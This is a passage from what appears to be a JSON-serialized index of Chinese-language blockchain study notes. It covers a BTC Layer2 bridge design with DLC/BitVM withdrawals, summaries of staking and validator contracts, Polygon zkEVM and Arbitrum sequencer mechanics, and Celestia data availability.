地址，这是用户自己在L2的地址，私钥自己控制)\n\n\n【提现】\n\n用户提款，直接将在L2上的资产burn掉，然后relayer 监控L2的withdraw事件 ，然后要区分是DLC还是bitvm 的withdraw\n\nDLC withdraw\nBitVm withdraw\n\n\n\n角色\nRelayer :\n\n监控比特币网络，将最新的比特币区块信息提交到l2轻客户端合约\n\n？\nALice 的存款锁定交易达到7个之后，任何一方（？）向Layer2 桥合约提交铸币交易，同时必须附带SPV证明\nL2桥合约：\n桥验证\n实施方案\n\n\nbitvm 联盟节点 的实现 （tendermint 节点或者mpc 签名方案）\n\n\nDLC的实现，需要预先设置CET\n// Alice和BitVM联盟的2 of 2多签名输出\nAlicePublicKey = &quot;AlicePublicKey&quot;\nBitVMPublicKey = &quot;BitVMPublicKey&quot;\n\n// 创建一个2 of 2多签名输出\noutput1 = { value: 5, script: 2 &lt;AlicePublicKey&gt; &lt;BitVMPublicKey&gt; 2 CHECKMULTISIG }\n\n// CET1：1个月后Alice提取1 BTC\nCET1PublicKey = &quot;CET1PublicKey&quot;\nCET1AlicePrivateKey = &quot;CET1AlicePrivateKey&quot;\n\n// Alice在1个月后提交CET1AlicePrivateKey来解锁1 BTC\nCET1 = { value: 1, script: 1 &lt;AlicePublicKey&gt; CHECKSIGVERIFY 1 &lt;CET1PublicKey&gt; CHECKSIG }\n\n// CET2：3个月后Alice提取2 BTC\nCET2PublicKey = &quot;CET2PublicKey&quot;\nCET2AlicePrivateKey = &quot;CET2AlicePrivateKey&quot;\n\n// Alice在3个月后提交CET2AlicePrivateKey来解锁2 BTC\nCET2 = { value: 2, script: 1 &lt;AlicePublicKey&gt; CHECKSIGVERIFY 1 &lt;CET2PublicKey&gt; CHECKSIG }\n\n// Alice和BitVM联盟的交易\ntransaction = {\n  inputs: [ ... ],\n  outputs: [ output1, CET1, CET2 ],\n  locktime: 1 // 锁定时间1个月\n}\n\n\n\n\nL2层的合约已经有了，需要研究一下\n\n\n轻客户端实际也是一个合约，他是通过zkp来维护的（比特币的状态证明来更新维护比特币header），同时还提供验证比特币交易的合法性，通过将比特币上的lock交易的spv证明提交给合约来验证。验证成功，L2才会发行XBTC给用户\n\n\nRelayer 的实现 （无信任的机制）转发交易到L2智能合约，或者转发到bitvm 联盟节点\n\n\nbitlayer 合约\n【BTR】\n创建10亿个BTR，分配个不同的地址账户\n【LockingContract】\n按照预设的禀赋期和解锁期,逐步释放受益人锁仓的代币。在禀赋期内,受益人无法领取任何代币;在解锁期内,可根据时间的推移按比例领取。受益人可更改地址,也可领取当前已解锁的部分代币。合约的构造函数需要事先设置好所有参与者的锁仓计划。\n【MultiSigWallet】\n合约使用了OpenZeppelin的ECDSA(用于签名验证)和EnumerableSet(用于存储签名人和待执行交易)库。它通过事件来记录交易的生命周期。整个流程需要多个签名人的参与,从而实现了对资金的多重控制和审查,提高了安全性。应用场景包括多签名钱包、DAO等需要多方共同决策的场合。\n【token factory】\n这个合约充当了一个ERC20代币的工厂,允许管理员批量创建和铸造符合ERC20标准的代币,并使用了Create2确定性部署技术。可以用于需要快速发行大量ERC20代币的场景,如ICO、Airdrop等。\n【vault】\n总的来说,这个Vault合约提供了一个安全的存管库,由管理员控制对资产的发放,只有白名单地址才能接收发放的资产。它可以持有和发放原生代币(如ETH)和ERC20代币资产。常见的使用场景包括ICO、Airdrop等活动的资金存管,确保资金的安全管理和受控发放\n【WBTC】\n\n存款(deposit):任何人都可以通过向合约转账ETH来存款,存入的ETH数量将被视为等值的WBTC数量,并记录在该用户的WBTC余额中。receive函数会调用deposit函数完成存款。\n取款(withdraw): 持有WBTC余额的用户可以提取等值的ETH。取款时,用户的WBTC余额会被相应减少\n\n【params】\n这个名为 Params 的合约定义了一个区块链系统中使用的各种常量参数和修饰符。它的主要作用是:\n\n定义系统常量:\n\nCOEFFICIENT: 用于奖励计算时的扩大倍数。\nengineCaller: 引擎调用者的硬编码地址。\nMaxValidators: 系统中允许的最大验证者数量。\nMaxBackups: 系统中允许的最大备用验证者数量。\nMaxStakes: 每个验证者的最大总质押tokens。\nThresholdStakes: 验证者成为有效候选者所需的最小总质押。\nMinSelfStakes: 用户注册验证者所需的最小自我质押。\nStakeUnit: 质押的单位,这里是1个以太币。\nJailPeriod: 验证者被监禁的区块数量(大约3天)。\nUnboundLockPeriod: 验证者解绑质押时的延迟时间(28天)。\nPunishBase: 惩罚计算的基础值。\nLazyPunishFactor: 验证者未能按时出块时的惩罚系数。\nLazyPunishThreshold: 对验证者进行惩罚的累计缺块数量。\nDecreaseRate: 每个验证者在一个周期内允许的最大缺块数量。\n\n\n\n这个合约似乎是一个较大系统的一部分,用于管理区块链网络中的验证者、质押和惩罚相关的参数。这些常量定义了验证者、质押和惩罚计算中的各种限制、阈值和参数。修饰符用于限制对某些函数的访问权限,基于调用者的地址或传入地址的有效性。\n【staking】\n这个合约名为 Staking，主要用于管理一个基于权益证明(PoS)共识机制的区块链网络中的验证者(Validator)。它具有以下主要功能:\n\n\n初始化和配置\n\n初始化验证者参数,如最大验证者数量、最小质押要求等\n在创世块时初始化一批初始验证者\n\n\n\n验证者注册和管理\n\n支持新验证者注册(可在无需许可或需要管理员许可的情况下注册)\n验证者可以增加或减少自身的质押金额\n用户可以为验证者delegation(委托)或从验证者取消delegation\n\n\n\n奖励分发\n\n区块手续费将按比例分发给活跃验证者和备用验证者\n计算并更新每个验证者应得的奖励\n\n\n\n惩罚机制\n\n惩罚未能正常出块的验证者,按照错过的块数量扣减其质押\n采用渐进惩罚策略,错过一定数量块时扣除质押\n\n\n\n验证者集更新\n\n链上组件可调用函数更新活跃验证者集和备用验证者集\n根据总质押量动态调整验证者排名\n\n\n\n查询功能\n\n查询活跃/备用验证者列表\n查询任意地址在某验证者处的可提取金额(含质押和奖励)\n\n\n\n该合约通过初始化、注册、奖惩等机制来维护和管理整个验证者集体,确保网络的正常运行和安全性。它实现了链上管理验证者所需的各种功能。\n【va lidator】\n\n验证者状态与配置：\n\n合约中包含一个验证者的地址（validator），该地址参与共识过程。\n验证者可设置佣金率（commissionRate），用于收取委托人收益的一部分作为管理费用。\n自持权益（selfStake）代表验证者自己投入的权益。\n总权益（totalStake）等于自持权益加上所有其他委托人的权益。\nacceptDelegation 标志表明验证者是否接受委托。\nstate 表示验证者的当前状态（如就绪、退出等），并可以进行状态变更。\n合约还维护了其他相关参数，如退出锁定结束时间（exitLockEnd）、惩罚区块高度（punishBlk）、累计惩罚因子（accPunishFactor）等。\n\n\n委托管理：\n\nDelegation 结构体记录了每个委托人的详细信息，如是否存在委托关系、权益数量、已结算奖励、债务等。\nallDelegatorAddrs 存储所有委托人的地址列表，便于遍历。\ndelegators 映射表以委托人地址为键，存储对应的 Delegation 结构体，管理各个委托人的权益和状态。\nPendingUnbound 和 UnboundRecord 结构体及相关映射表用于跟踪委托人待解除绑定的权益及其锁定状态。\n\n\n权益操作：\n\naddStake 函数允许验证者增加自持权益，同时更新累计奖励和内部债务，并可能触发排名操作。\nsubStake 函数允许验证者减少自持权益，可选择是否将减少的权益标记为待解除绑定。函数还会调整总未提取权益。\nexitStaking 函数使验证者退出staking状态，结算奖励，添加待解除绑定记录，并更新状态。\n\n\n奖励与费用处理：\n\nreceiveFee 函数处理收到的费用，根据佣金率分配给验证者和委托人，并更新累计奖励率。\nvalidatorClaimAny 函数允许验证者领取其应得的奖励（包括staking奖励、佣金和费用），同时处理待解除绑定的权益。奖励通过 _recipient 地址发送出去，并触发 RewardsWithdrawn 事件。\n\n\n访问控制与限制：\n\n使用 onlyOwner 和 onlyAdmin 修饰符保护仅允许特定地址（如 Staking 合约地址或管理员地址）调用某些方法。\n使用 onlyCanDoStaking 修饰符确保在允许staking的状态下才能进行权益增减操作。\n使用 onlyValidRate 修饰符确保佣金率在有效范围内（0到100之间）。\n\n\n添加委托 (addDelegation)\n\n确保验证者接受委托且总权益不超过最大值。\n如果委托人为新用户，将其添加至 allDelegatorAddrs 列表。\n调用 handleDelegatorPunishment 处理委托人可能的惩罚。\n更新委托人的债务、权益，并调用 addTotalStake 更新总权益及触发排名操作。\n返回排名操作结果。\n\n\n减少委托 (subDelegation)\n\n调用 handleDelegatorPunishment 处理委托人可能的惩罚。\n转调 innerSubDelegation 实现减少委托的具体逻辑。\n\n\n退出委托 (exitDelegation)\n\n确保委托人有权益。\n调用 handleDelegatorPunishment 处理惩罚。\n调用 innerSubDelegation 减少全部权益，并设置 _isUnbound 为 true，将全部权益标记为待解除绑定。\n返回排名操作结果及减少的权益数量。\n\n\n内部减少委托 (innerSubDelegation)\n\n更新委托人的已结算奖励、权益，并根据 _isUnbound 参数决定是否添加待解除绑定记录或从 totalUnWithdrawn 中扣除权益。\n调用 subTotalStake 减少总权益及触发排名操作。\n返回排名操作结果。\n\n\n委托人领取奖励 (delegatorClaimAny)\n\n调用 handleDelegatorPunishment 处理惩罚。\n计算委托人的staking奖励，并重置委托人的债务和已结算奖励。\n计算可提取的解除绑定权益（_unboundAmount）。\n若验证者处于退出状态且解锁期已过，将剩余权益强制解除绑定（_forceUnbound），并从总权益中移除。\n减少 totalUnWithdrawn 并根据实际奖励金额向委托人发送以太币，触发 RewardsWithdrawn 事件。\n返回可提取的解除绑定权益和强制解除绑定的权益。\n\n\n处理委托人惩罚 (handleDelegatorPunishment)\n\n计算委托人应受的惩罚（calcDelegatorPunishment）。\n更新委托人的 punishFree 值。\n若惩罚金额大于0，先从委托人的权益中削减，若不足则从待解除绑定权益中削减。\n\n\n计算委托人惩罚 (calcDelegatorPunishment)\n\n根据当前累计惩罚因子与委托人上次惩罚后的 punishFree 值计算应削减的权益比例。\n根据比例和委托人的总权益（包括待解除绑定部分）计算实际削减金额。\n\n\n判断是否允许staking操作 (canDoStaking)\n\n返回验证者当前状态是否为允许staking的状态（如空闲、就绪或处于监禁状态但超过监禁期）。\n\n\n添加待解除绑定记录 (addUnboundRecord)\n\n将指定委托人和解除绑定权益金额添加至 UnboundRecord 结构体中，设置解除锁定结束时间。\n\n\n处理可提取的解除绑定权益 (processClaimableUnbound)\n\n遍历委托人的待解除绑定记录，释放已过解锁期的权益，返回可提取的解除绑定权益总额。\n\n\n从待解除绑定权益中削减 (slashFromUnbound)\n\n接收一个地址 _owner 和一个金额 _amount，从该地址的待解除绑定记录中削减指定金额的权益。\n验证待解除绑定总额是否足够，然后遍历待解除绑定记录，依次扣减金额直至达到 _amount 或所有记录被处理。\n清理已完成的解除绑定记录，并更新待解除绑定总额。\n\n\n增加总权益并触发排名操作 (addTotalStake)\n\n增加总权益（totalStake）和未提取权益总额（totalUnWithdrawn）。\n根据增加后总权益值调整验证者状态：\n\n如果达到阈值且自质押满足最小要求，则从非准备状态（Idle或Jail）变为准备状态（Ready），返回排名操作类型 Up。\n如果原为监禁状态（Jail），但总权益仍低于阈值或自质押不足最小要求，则变为闲置状态（Idle），返回 Noop。\n\n\n\n\n减少总权益并触发排名操作 (subTotalStake)\n\n减少总权益（totalStake）。\n根据减少后总权益值调整验证者状态：\n\n如果原为准备状态（Ready），且总权益低于阈值，则变为闲置状态（Idle），返回排名操作类型 Remove；否则返回 Down。\n如果原为监禁状态（Jail），则检查总权益和自质押是否满足恢复到准备状态的条件，否则保持在闲置状态。返回相应排名操作类型。\n\n\n\n\n惩罚 (punish)\n\n接收一个惩罚因子 _factor，根据此因子削减验证者和管理员的权益。\n更新累积惩罚因子（accPunishFactor），记录惩罚发生时的区块号（punishBlk），并将验证者状态设为监禁（State.Jail），触发 StateChanged 事件。\n\n\n查询可提取权益 (anyClaimable)\n\n根据调用者身份（管理员或普通委托人）分别调用 validatorClaimable 或 delegatorClaimable，返回可提取的解除绑定权益和staking奖励。\n\n\n查询验证者可提取权益 (validatorClaimable)\n\n计算验证者可提取的解除绑定权益和staking奖励（包括佣金），并按系数调整为实际值。\n\n\n查询委托人可提取权益 (delegatorClaimable)\n\n计算委托人可提取的解除绑定权益和staking奖励，考虑惩罚因素（削减权益）、验证者退出状态及锁定期限。\n\n\n获取可提取解除绑定权益 (getClaimableUnbound)\n\n用于计算指定地址 _owner 当前可提取的解除绑定权益。\n\n\n获取待解除绑定记录详情 (getPendingUnboundRecord)\n\n返回指定地址 _owner 的待解除绑定记录列表中指定索引 _index 的记录所包含的权益金额和解锁结束时间。\n\n\n获取所有委托人数量 (getAllDelegatorsLength)\n\n返回 allDelegatorAddrs 列表中委托人的数量。\n\n\n"},"blockchainguide/Layer2_Solutions/btclayer2/bitvm":{"slug":"blockchainguide/Layer2_Solutions/btclayer2/bitvm","filePath":"blockchainguide/Layer2_Solutions/btclayer2/bitvm.md","title":"bitvm","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/btclayer2/btclayer2社区资料汇总":{"slug":"blockchainguide/Layer2_Solutions/btclayer2/btclayer2社区资料汇总","filePath":"blockchainguide/Layer2_Solutions/btclayer2/btclayer2社区资料汇总.md","title":"btclayer2社区资料汇总","links":[],"tags":[],"content":"\nbitvm.org/\nlinktr.ee/roos_btcl2 roos 参考\nbob. github.com/bob-collective/bob参考\ngithub.com/orgs/Tunachain/repositories (重点)\nzksats.io/bridge (利用polygon的zk 方案)\nbvm.network/ (重中之重)\ngithub.com/l2labs （）\n"},"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/QA和资料":{"slug":"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/QA和资料","filePath":"blockchainguide/Layer2_Solutions/layer2/Polygon  zkevm/QA和资料.md","title":"QA和资料","links":[],"tags":[],"content":"\n多签合约\n\n资料\ngithub.com/0xPolygonHermez/zkevm-techdocs/tree/a6d46da98ad32ace544e5dbc31d34831f9cc1bdd\nwww.reddit.com/api/v1/authorize%20state=randomstring&amp;redirect_uri=test1.erbie.io/oauth2&amp;duration=permanent&amp;scope=identity%20read%20submit%20vote"},"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/polygon-zk-evm-概述-":{"slug":"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/polygon-zk-evm-概述-","filePath":"blockchainguide/Layer2_Solutions/layer2/Polygon  zkevm/polygon zk evm 概述 .md","title":"polygon zk evm 概述 ","links":[],"tags":[],"content":"\nzknode\nzk bridge\nzk prover\n为什么设计一个交易一个区块\n\n\n架构\n\n\nonsensus Contract (PolygonZkEVM.sol)\nzkNode\n\nSynchronizer\nSequencers &amp; Aggregators\nRPC\n\n\nzkProver\nzkEVM Bridge\n\n"},"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/zk-contracts":{"slug":"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/zk-contracts","filePath":"blockchainguide/Layer2_Solutions/layer2/Polygon  zkevm/zk-contracts.md","title":"zk-contracts","links":[],"tags":[],"content":""},"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/zkevm-代码分析":{"slug":"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/zkevm-代码分析","filePath":"blockchainguide/Layer2_Solutions/layer2/Polygon  zkevm/zkevm 代码分析.md","title":"zkevm 代码分析","links":[],"tags":[],"content":"www.bcskill.com/index.php/archives/1818.html"},"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/核心组件":{"slug":"blockchainguide/Layer2_Solutions/layer2/Polygon--zkevm/核心组件","filePath":"blockchainguide/Layer2_Solutions/layer2/Polygon  zkevm/核心组件.md","title":"核心组件","links":[],"tags":[],"content":"sequencer\n\n将交易打包成batch，提交到L1 的合约上 （目前batch里只有一个交易，这也是方便生成证明）\n\nAggregator （类似proposer）\n\n监听L1上的batch提交事件，会把batch交易同步到自己节点，然后发送给zkprover\n当收到zkprover的有效性证明，以及对应batch执行后的状态提交给L1的polygon zkevm 合约（类似validator）里 （状态谁给的？），实际上你可以把polygon zkevm 合约当做是共识层，因为只有验证通过才能进行下一步。\n\nzkprover\n\n接收到Aggregator 发过来的交易后，会为每个batch的每笔交易生成validity proof， 然后将多个batch里的每笔交易的proof聚合成一个新的总的validity proof\n当聚合了多个batch的validity proof 发送给Aggregator\n\nDAC\nPolygon 的cdk validium 是链下保存了交易数据，并没有发布数据到L1，只是整体数据的一个Hash值，所以有个DAC委员会专门验证sequencer提交的交易数据 ，实际就是sequencer提交了一堆交易，DAC需要进行校验是否有不存在的交易，他应该会从交易池中拉取交易，只要验证通过就会对这包交易数据进行签名，使用的事多签，m-out-of-n ,然后会把签名附加到交易数据的哈希值撒好难过，多签合约在L1上，可以验证\nPolygon CDK validium  流程\n\nSqequncer 收集交易并将其添加到区块中（这个是zkevm 本身的网络区块吗），然后将区块分批放入，同时递归计算其哈希值\n然后sequncer 将批量数据和相应的哈希值发到DAC，请求签名\nDAC收到后会对每个批次哈希值进行验证并存储在DAC节点的本地数据库里，并为每个批次哈希生成签名\nsequencer收集DAC成员的签名和原始批次哈希，提交到以太坊的多签合约中\naggregator 会为batch准备证明，然后提交到以太坊\n\nreference\nforesightnews.pro/article/detail/32223"},"blockchainguide/Layer2_Solutions/layer2/arbitrum/arbitrum生命周期":{"slug":"blockchainguide/Layer2_Solutions/layer2/arbitrum/arbitrum生命周期","filePath":"blockchainguide/Layer2_Solutions/layer2/arbitrum/arbitrum生命周期.md","title":"arbitrum生命周期","links":[],"tags":[],"content":"\n文章参考官方文档，对官方文档进行了解读，并对主要内容进行了记录\ndeveloper.offchainlabs.com/\n\n\n词汇表： developer.offchainlabs.com/intro/glossary\n\narbitrum 交易的生命周期\n1. Sequencer接收交易\nsequencer 从客户端接收交易并排序，它通过以下方式接收：\n\n\nDirectly / Offchain\n\n对于L2原生dapp, 客户端会将他们的钱包连接到 L2 节点并直接交付签名交易\n\n\n\nor from L1 (via the Delayed Inbox)\n\n或者客户端可以通过在 Arbitrum 链的延迟收件箱中签署和发布 L1 交易来向sequencer发送消息。此功能最常用于通过桥存入 ETH 或代币\n\n\n\nSee:\n\nRetryables\nThe Sequencer\nToken Bridge\n\n2.Sequencer 对离线交易排序\n一旦接收交易，Sequencer会做以下事情：\n\n在链下收件箱中订购\n使用 Arbitrum Nitro VM 在本地执行（包括收集/分配 L1 和 L2 费用等）\n“即时”向客户提供交易收据（“即时”是因为它不需要任何额外的链上确认，通常不会超过一两秒）\n\nSee:\n\nArbOS\nGeth\nL1 pricing / L2 Gas\n\n在此阶段，客户端对最终性的接受依赖于对 Sequencer 的信任。即，恶意/错误的 Sequencer 可能会偏离它在交易收据中承诺的内容和最终批量发布的内容（参见第 3 阶段）\n\n即使是恶意/有故障的 Sequencer 也只能在最坏的情况下重新排序或暂时延迟交易；例如，它不能伪造客户的交易或提出无效的状态更新。考虑到第 2 阶段对 Sequencer 的信任程度，我们有时将 Sequencer 提供的“即时”收据称为“软确认”。\n\n3. Sequencer 批量发布交易（链上）\nSequencer 最终会发布一批 L2 交易，其中包括我们客户的交易到基础 L1（作为CALLDATA）；在正常情况下，Sequencer 将每隔几分钟发布一次批次。\n3a: 如果 Sequencer 从未包含我们的交易怎么办？\n即使 Sequencer 从未将我们的交易包含在一个批次中，客户也可以通过在延迟的收件箱中发布并将其包含在 L2 中，然后在一段延迟时间（目前在 Arbitrum One 上大约 24 小时）后“强制包含”它。\nSequencer 被迫按照它们出现在链上的排队顺序包含来自延迟收件箱的消息，即它使用“先进先出”方法处理消息。因此，它不能在包含其他消息的同时选择性地延迟特定消息；即，延迟队列前面的消息意味着也延迟它后面的所有消息。\nSee:\n\n“The Sequencer / Censorship Resistance.”\n\n在这个阶段，假设客户相信至少有一个行为良好的活跃 Arbitrum 验证者（回想一下在 Arbitrum Rollup 中，验证是无需许可的），客户可以将他们的交易的最终性视为等同于普通的以太坊交易。换句话说，他们的 L2 交易与批量记录它的 L1 交易具有相同的最终性。这意味着客户应该使用他们用于常规以太坊交易的任何最终性启发式（即等待 L1 块确认等），应用于 L1 批量发布交易。这也意味着客户对 Sequencer 的软确认（第 2 阶段）的信任模型感到不舒服，可以简单地等待 Sequencer 批量发布他们的交易（第 3 阶段）\n\n一旦 Sequencer 发布了一个 batch，它的交易顺序完全由 L1 决定；实际上，Sequencer 在我们的交易生命周期中根本没有发言权。\nL1 上的收件箱合约确保当 Sequencer 发布批次时，它发布的数据足以让任何 Arbitrum 节点重建和验证 L2 链的状态；即，此“输入”数据的可用性由以太坊本身保证。\nArbitrum 上的执行是完全确定的；即，当前链状态和新输入数据足以计算新链状态；因此，一旦此输入数据可用（即，当 Sequencer 发布批次时），就可以计算 L2 链的状态。\nArbitrum防错系统完善；也就是说，如果任何验证者（后来）试图偏离有效的 L2 状态，诚实的验证者最终将能够挑战并获胜。因为我们已经知道有效状态最终会胜出，所以我们现在可以将我们的交易视为 L1 最终确定的。\n\n4.Validator 断言包含交易的 RBlock\n然后，一个抵押的、活跃的验证者将在收件箱中的输入上运行 Arbitrum VM（就像 Sequencer 之前所做的一样，除了现在只在 L1 上发布的交易上）并对链的最新状态做出链上断言，即汇总块或“RBlock”。 RBlocks 通常每 30-60 分钟被断言一次。\n\nRBlock 断言包括关于发件箱状态的声明；如果我们的交易触发了任何 L2 到 L1 消息，RBlock 将包含对发件箱的更新以反映其包含。\n\nSee:\n\nThe Outbox\n\n4a:RBlock 有效/不受挑战\n在快乐/常见的情况下，验证者断言了一个有效的 RBlock，并且在争议窗口的过程中——在 Arbitrum One 上 1 周——没有其他验证者质疑它。\n4b:断言受到挑战！\n如果两个验证者断言不同的 RBlocks，则只有（至多）其中一个可以有效，因此他们会陷入争议。\n争议包括两个质押验证者将他们的分歧分解为单个 L2 块，然后将该块内的 VM 指令序列分解为单个操作码，最后执行该单个操作。 Arbitrum 使用的底层 VM 是 WebAssembly (Wasm)，或者更准确地说，是“WAVM”。这都由 L1 上的合约引用。\nSee:\n\nChallenges\nWasm/WAVM\n\nL1 合约还跟踪所有断言树；即，有多少利益相关者存在分歧，目前谁在与谁争论等等。我们将 Arbitrum 设计架构的这一级别称为其“断言树协议”。\nSee:\n\nAssertion Tree Protocol\n\n还记得在阶段 3 中说过一旦 L1 承诺输入，我们就可以保证 L2 输出吗？我们是认真的！即使在争议期间，Arbitrum 节点也会继续执行，并且活跃的验证者会继续对状态树中的有效叶子做出断言；在第 4 阶段可能发生的任何事情都不会影响我们在第 3 阶段已经锁定的 L1 级最终确定性。\n5.RBlock 在 L1 上被确认\n一旦所有争议都得到解决并且经过了足够的时间，我们的 RBlock 就可以在 L1 上得到确认（L1 上的任何以太坊账户都可以确认）。确认后，L1 上的发件箱根目录得到更新。\n甚至在阶段 5 之前，客户端对他们的 L2 到 L1 消息的结果具有 L1 最终确定性，他们只是还不能执行它；也就是说，他们可以保证他们最终能够，例如，完成他们的提款，他们只是不能在 RBlock 被确认之前在 L1 上领取他们的资金。"},"blockchainguide/Layer2_Solutions/layer2/arbitrum/sequencer":{"slug":"blockchainguide/Layer2_Solutions/layer2/arbitrum/sequencer","filePath":"blockchainguide/Layer2_Solutions/layer2/arbitrum/sequencer.md","title":"sequencer","links":[],"tags":[],"content":"定序器和审查阻力\nSequencer是专门指定的Arbitrum全节点，在正常情况下，负责将用户的交易提交到L2。原则上，链的 Sequencer 可以采用不同的形式；正如 Arbitrum One 目前的情况，Sequencer 是一个单一的、集中的实体；最终，排序功能将提供给一个分布式排序委员会，该委员会就排序达成共识。然而，无论其形式如何，Sequencer 都有一个不适用于系统任何其他部分的基本限制：它必须在自己的安全假设下运行；也就是说，原则上，它不能直接从第 1 层获得安全性。这就提出了一个问题，即当 Sequencer 行为不当时，Arbitrum Rollup 如何保持其抗审查性的主张。\n在这里，我们将描述 Sequencer 通常如何运行的机制，以及任何用户如何完全绕过 Sequencer 直接从第 1 层提交任何 Arbitrum 交易（包括启动 L2 到 L1 消息以提取资金的交易）。因此因此，即使 Sequencer 完全没有响应甚至是恶意的，该机制也能保持审查抵抗力。\n核心收件箱\n当我们谈论“将交易提交到 Arbitrum 链中”时，我们是在谈论将其包含到链的核心收件箱中，由 Bridge 中的 sequencerInboxAccs 字节数组表示。一旦交易被包含在核心收件箱中，它们的顺序是固定的，执行是完全确定的，我们可以不信任地将结果状态视为具有 L1 级最终性（参见“交易生命周期”）。 Sequencer 的角色（或缺乏角色）严格关注之前发生的事情；即，交易如何进入核心收件箱。我们将把交易可能采用的路由分为两种情况：行为良好的 Sequencer 和有故障的 Sequencer。\n快乐/常见案例：Sequencer 已上线且表现良好\n在这里，我们首先假设 Sequencer 是完全可操作的，并且以尽可能安全和及时的方式处理用户交易的目的运行。 Sequencer 可以通过两种方式接收用户的交易——直接通过 RPC 请求，或通过底层 L1。\n如果用户发布“标准”Arbitrum 交易（即与 L2 原生 dapp 交互），用户将直接向 Sequencer 提交已签名的交易，就像用户在与 L1 交互时向以太坊节点提交交易一样.收到它后，Sequencer 将执行它并几乎立即向用户发送收据。不久之后——通常不超过几分钟——Sequencer 将把用户的交易包含在一个批次中，并通过调用 SequencerInbox 的 addSequencerL2Batch 方法之一将其发布到 L1 上。请注意，只有 Sequencer 才有权调用这些方法；事实上，这种任何其他方都不能直接包含消息的保证正是赋予 Sequencer 提供即时“软确认”收据的独特能力的关键所在。一旦成批发布，交易就具有 L1 级最终确定性。\n或者，用户可以通过将其发布到底层 L1 上来将其 L2 消息提交给 Sequencer。如果用户希望与 L2 消息一起执行一些 L1 操作并保持两者之间的原子性，则此路径是必需的——这里的教科书示例是通过桥接的代币存款（在 L1 上托管，在 L2 上铸币）。用户通过发布调用收件箱合约上相关方法之一的 L1 交易（即向 L1 节点发送普通交易）来实现此目的；即，sendUnsignedTransaction。这会在我们称之为“延迟收件箱”的地方添加一条消息（由 Bridge 合约中的 delayedInboxAccs 表示），这实际上是一个队列，消息在被移至核心收件箱之前等待。 Sequencer 将在交易被包含在延迟的收件箱中约 10 分钟后发出 L2 收据（延迟的原因是为了最大限度地减少短期 L1 重组的风险，这可能会导致 L2 重组并使 Sequencer 的 L2 无效收据。）同样，最后一步是 Sequencer 将 L2 消息包含在批处理中——当调用批处理提交方法时，Sequencer 指定延迟收件箱中要包含的消息数——完成交易。\n总而言之——无论哪种情况，用户首先将他们的消息传递给 Sequencer，Sequencer 确保消息到达核心收件箱。\n不愉快/不常见的情况：Sequencer 没有完成它的工作\n现在让我们假设 Sequencer，无论出于何种原因，完全无法执行其提交消息的任务。用户仍然可以通过两个步骤获得他们的交易：\n首先，他们如上所述通过 L1 将 L2 消息提交到延迟收件箱：请注意，尽管原子跨链消息是使用延迟收件箱的常见情况，但原则上它可以用于提交任何 L2 消息。\n一旦进入延迟收件箱，我们显然不能依赖 Sequencer 将交易包含在批处理中。相反，我们可以使用 SequencerInbox 的 forceInclusion 方法。一旦消息在延迟收件箱中停留了足够长的时间，就可以调用 forceInclusion 将其从延迟收件箱移动到核心收件箱中，此时它已完成。至关重要的是，任何帐户都可以调用 forceInclusion。\n目前，在 Arbitrum One 上，提交和强制包含之间的延迟时间大约为 24 小时，由 maxTimeVariation.delayBlocks / maxTimeVariation.delaySeconds 指定。来自 L1 的强制包含将直接影响任何未确认的 L2 交易的状态；保持保守的高延迟值确保它只应在特殊情况下使用。\n除了延迟本身之外，forceInclusion 路径还存在交易排序不确定性的缺点；即，在等待消息的最大延迟通过时，恶意的 Sequencer 原则上可以直接在它前面发布消息。然而，Sequencer 最终无法阻止它被包含在核心收件箱中，此时它的排序已经完成。\n虽然缓慢、“不愉快”的路径不是最优的，而且很少（如果有的话）是必要的，但它作为一个选项的可用性确保 Arbitrum Rollup 始终保留其不信任的安全模型，即使系统的许可部分出现故障也是如此。"},"blockchainguide/Layer2_Solutions/layer2/arbitrum/跨链消息":{"slug":"blockchainguide/Layer2_Solutions/layer2/arbitrum/跨链消息","filePath":"blockchainguide/Layer2_Solutions/layer2/arbitrum/跨链消息.md","title":"跨链消息","links":[],"tags":[],"content":"L1 to L2 消息"},"blockchainguide/Layer2_Solutions/layer2/celestia/celestia简介":{"slug":"blockchainguide/Layer2_Solutions/layer2/celestia/celestia简介","filePath":"blockchainguide/Layer2_Solutions/layer2/celestia/celestia简介.md","title":"celestia简介","links":[],"tags":[],"content":"介绍\nCelestia is a data availability (DA) layer that provides a scalable solution to the data availability problem.\n关键功能\ndata availability sampling (DAS)\nCelestia使用二维Reed-Solomon编码方案对块数据进行编码：将每个块数据拆分为k×k个块，排列在k×k矩阵中，并通过多次Reed-Solmon编码将奇偶校验数据扩展为2k×2k扩展矩阵\n然后，为扩展矩阵的行和列计算4k个单独的Merkle根；这些Merkle根的Merkle根部被用作块报头中的块数据承诺。\nNamespaced Merkle trees (NMTs).\nQA"},"blockchainguide/Layer2_Solutions/layer2/layer2资料":{"slug":"blockchainguide/Layer2_Solutions/layer2/layer2资料","filePath":"blockchainguide/Layer2_Solutions/layer2/layer2资料.md","title":"layer2资料","links":[],"tags":[],"content":"layer2.wenwoha.com\n数据可用性的理解\n数据可用性的理解概要\n以太坊 Rollup 与 Celestia 上的主权 Rollup 之间的权衡"},"blockchainguide/Layer2_Solutions/layer2/optimism/op-node设计分析":{"slug":"blockchainguide/Layer2_Solutions/layer2/optimism/op-node设计分析","filePath":"blockchainguide/Layer2_Solutions/layer2/optimism/op-node设计分析.md","title":"op-node设计分析","links":[],"tags":[],"content":"op-node主要有以下几件事：\n\n从L1导出区块并将其驱动到引擎中来同步区块\n如果启用了备份不安全同步客户端，请启动其事件循环\n\n下面将主要分析event loop 做的事情：\nfunc (s *Driver) eventLoop() {\n  ...\n  select {\n\t\tcase &lt;-sequencerCh:\n\t\t\tpayload, err := s.sequencer.RunNextSequencerAction(ctx)\n\t\t\tif err != nil {\n\t\t\t\ts.log.Error(&quot;Sequencer critical error&quot;, &quot;err&quot;, err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tif s.network != nil &amp;&amp; payload != nil {\n\t\t\t\t// Publishing of unsafe data via p2p is optional.\n\t\t\t\t// Errors are not severe enough to change/halt 